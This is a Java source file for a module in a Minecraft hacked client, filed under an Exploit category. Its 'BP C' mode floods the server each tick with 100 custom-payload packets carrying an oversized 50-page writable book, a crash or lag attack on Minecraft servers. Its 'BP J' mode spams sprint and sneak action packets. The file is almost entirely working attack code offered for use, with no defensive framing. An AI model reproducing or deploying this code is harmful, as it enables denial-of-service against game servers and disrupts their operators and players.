package uwu.noctura.module.impl.exploit;

import io.netty.buffer.Unpooled;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C0BPacketEntityAction;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import uwu.noctura.Noctura;
import uwu.noctura.event.Event;
import uwu.noctura.event.impl.EventSendPacket;
import uwu.noctura.event.impl.EventUpdate;
import uwu.noctura.module.Category;
import uwu.noctura.module.Module;
import uwu.noctura.module.ModuleInfo;
import uwu.noctura.module.setting.impl.GraphSetting;
import uwu.noctura.module.setting.impl.ModeSetting;
import uwu.noctura.notification.Notification;
import uwu.noctura.notification.NotificationType;
import uwu.noctura.utils.PacketUtil;

import java.util.Random;

@ModuleInfo(name = "TestModule", displayName = "Test Module", key = -1, cat = Category.Exploit)
public class TestModule extends Module {

    //public GraphSetting graph = new GraphSetting("Graph",1,1,0,10,0,10,1,1);
    public ModeSetting falses = new ModeSetting("Mode", "BP J", "BP J", "BP C");

    public TestModule(){
        addSettings(falses);
    }

    @Override
    public void onEnable() {
        Noctura.INSTANCE.getNotificationManager().addToQueue(new Notification(NotificationType.INFO,"Blur testing", "tenatitty blur edition"));
    }

    @Override
    public void onEvent(Event e) {
        if(e instanceof EventUpdate){
            if(mc.thePlayer.ticksExisted < 10){
                this.toggle();
            }
            switch (falses.getMode()){
                case "BP J":{
                    PacketUtil.sendSilentPacket(new C0BPacketEntityAction(mc.thePlayer, C0BPacketEntityAction.Action.START_SPRINTING));
                    PacketUtil.sendSilentPacket(new C0BPacketEntityAction(mc.thePlayer, C0BPacketEntityAction.Action.STOP_SPRINTING));
                    if(mc.thePlayer.ticksExisted % 10 == 0){
                        PacketUtil.sendSilentPacket(new C0BPacketEntityAction(mc.thePlayer, C0BPacketEntityAction.Action.START_SNEAKING));
                        PacketUtil.sendSilentPacket(new C0BPacketEntityAction(mc.thePlayer, C0BPacketEntityAction.Action.STOP_SNEAKING));
                    }
                    break;
                }
                case "BP C":{
                    EventUpdate ev = (EventUpdate)e;
                    if(!ev.isPre()){
                        return;
                    }
                    if(mc.thePlayer.ticksExisted < 10){
                        this.toggle();
                        return;
                    }
                    ItemStack bookStack;
                    NBTTagCompound bookCompound;
                    NBTTagList pageList;
                    String pageText;
                    int page, packets;
                    double x, y, z;
                    int i;

                    bookStack = new ItemStack(Items.writable_book);
                    bookCompound = new NBTTagCompound();
                    bookCompound.setInteger("author", 20);
                    bookCompound.setInteger("title", 20);
                    pageList = new NBTTagList();
                    pageText = String.valueOf(600);
                    for (page = 0; page < 50; page++)
                        pageList.appendTag((NBTBase) new NBTTagString(pageText));
                    bookCompound.setTag("pages", (NBTBase) pageList);
                    bookStack.writeToNBT(bookCompound);
                    for (packets = 0; packets < 100; packets++) {
                        PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
                        packetBuffer.writeItemStackToBuffer(bookStack);
                        PacketUtil.sendSilentPacket((Packet) new C17PacketCustomPayload((new Random()).nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
                    }

                    //PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
                    //PacketUtil.sendSilentPacket(new C17PacketCustomPayload("MC|BSign", packetBuffer));
                    break;
                }

            }
        }
        if(e instanceof EventSendPacket){
            EventSendPacket ev = (EventSendPacket) e;

        }
    }

}
